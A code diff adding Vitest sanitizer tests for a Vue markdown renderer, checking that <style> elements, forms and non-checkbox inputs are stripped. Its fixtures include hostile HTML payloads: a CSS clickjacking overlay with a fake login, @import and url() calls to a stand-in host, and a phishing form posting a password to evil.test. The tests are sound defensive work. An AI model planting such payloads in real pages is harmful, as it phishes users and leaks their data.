@@ -157,3 +157,98 @@ describe('useMarkdownRenderer 消毒：Shiki 區塊的 style 保留', () => {
     expect(html).not.toContain('position')
   })
 })
+
+/**
+ * 審查發現的繞過（真實 Chromium 重現）：
+ *  - DOMPurify 預設允許 <style> 元素 → 全版蓋板 / 點擊劫持 / @import 對外請求
+ *  - ADD_TAGS input + ADD_ATTR type → 可用的釣魚表單（action 未被剝除）
+ * 以實際 DOM 結構斷言（解析後不存在這些元素），而非字串比對。
+ */
+describe('useMarkdownRenderer 消毒：<style> 元素一律移除', () => {
+  const overlay =
+    '<p>a</p><style>#real{display:none} .ov{position:fixed;inset:0;z-index:9999} body{background:url(https://evil.test/x)}</style><p class="ov">FAKE LOGIN</p>'
+
+  it.each([
+    ['內文夾帶 <style>（全版蓋板）', overlay],
+    ['@import 對外請求', 'a\n\n<style>@import url(https://evil.test/imp.css);</style>'],
+    ['pre.shiki 內的 <style>', '<pre class="shiki"><style>.x{background:url(https://evil.test/in)}</style></pre>'],
+    ['svg 內的 <style>', '<svg><style>.x{background:url(https://evil.test/svg)}</style><circle r="1"/></svg>'],
+    ['大小寫混用', '<STYLE>body{display:none}</STYLE>'],
+  ])('%s：輸出中不存在任何 style 元素，樣式內容也不外洩成文字', (_label, markdown) => {
+    const html = render(markdown)
+    const root = parse(html)
+
+    expect(root.querySelectorAll('style').length).toBe(0)
+    expect(root.querySelectorAll('svg style, pre style').length).toBe(0)
+    expect(html).not.toMatch(/<style/i)
+    expect(html).not.toContain('evil.test')
+    expect(root.textContent).not.toMatch(/position:\s*fixed|@import|display:\s*none/)
+  })
+
+  it('蓋板案例中的 <p class="ov"> 仍存在但不帶 style 元素（只剩普通段落）', () => {
+    const root = parse(render(overlay))
+
+    expect(root.querySelector('p.ov')).not.toBeNull()
+    expect(root.querySelectorAll('style').length).toBe(0)
+  })
+
+  it('真實 Shiki 輸出不依賴 <style> 元素：高亮仍在、輸出無 style 元素', async () => {
+    const markdown = ref('```ts\nconst x = 1\n```\n```python\n@d\ndef f(): pass\n```')
+    const { renderedHtml, isReady } = useMarkdownRenderer(markdown)
+
+    await vi.waitFor(() => {
+      expect(isReady.value).toBe(true)
+      expect(renderedHtml.value).toContain('class="shiki')
+    }, { timeout: 20000 })
+
+    const root = parse(renderedHtml.value)
+    expect(root.querySelectorAll('style').length).toBe(0)
+    expect(root.querySelectorAll('pre.shiki span[style*="--shiki-"]').length).toBeGreaterThan(0)
+  }, 30000)
+})
+
+describe('useMarkdownRenderer 消毒：form 與非 checkbox 的 input', () => {
+  const phishing =
+    '<form action="https://evil.test/steal" method="post"><input type="password" name="p"><button>Login</button></form>'
+
+  // 一個 render 只放一個會被移除的節點：happy-dom 的 NodeIterator 在節點被移除後可能略過後續兄弟節點，
+  // 多個移除目標混在同一份輸入會測到模擬 DOM 的怪癖；組合 payload 另以真實 Chromium 驗證。
+  it('釣魚表單：不存在 form / input / button 元素，也沒有 action 屬性', () => {
+    const html = render(phishing)
+    const root = parse(html)
+
+    expect(root.querySelectorAll('form, input, button, textarea, select').length).toBe(0)
+    expect(root.querySelectorAll('[action], [formaction]').length).toBe(0)
+    expect(html).not.toContain('evil.test')
+    expect(html).not.toMatch(/type="password"/i)
+  })
+
+  it.each([
+    ['text', '<input type="text" name="u">'],
+    ['password', '<input type="password">'],
+    ['無 type（預設 text）', '<input name="u">'],
+    ['submit', '<input type="submit" value="Login">'],
+    ['image', '<input type="image" src="https://evil.test/i.png">'],
+    ['hidden', '<input type="hidden" name="t" value="x">'],
+    ['file', '<input type="file">'],
+  ])('非 checkbox 的 input（%s）整個元素被移除', (_label, markdown) => {
+    const root = parse(render(`<p>x</p>${markdown}`))
+
+    expect(root.querySelectorAll('input').length).toBe(0)
+  })
+
+  it('checkbox 仍保留（task list 功能不受影響）：type=checkbox、checked 屬性', () => {
+    const root = parse(render('- [x] done\n- [ ] todo'))
+    const boxes = root.querySelectorAll('input')
+
+    expect(boxes.length).toBe(2)
+    boxes.forEach((box) => expect(box.getAttribute('type')).toBe('checkbox'))
+    expect(root.querySelectorAll('input[checked]').length).toBe(1)
+  })
+
+  it('手寫 HTML 的 type="CHECKBOX"（大小寫）視為 checkbox 保留', () => {
+    const root = parse(render('<input type="CHECKBOX" checked disabled>'))
+
+    expect(root.querySelectorAll('input').length).toBe(1)
+  })
+})
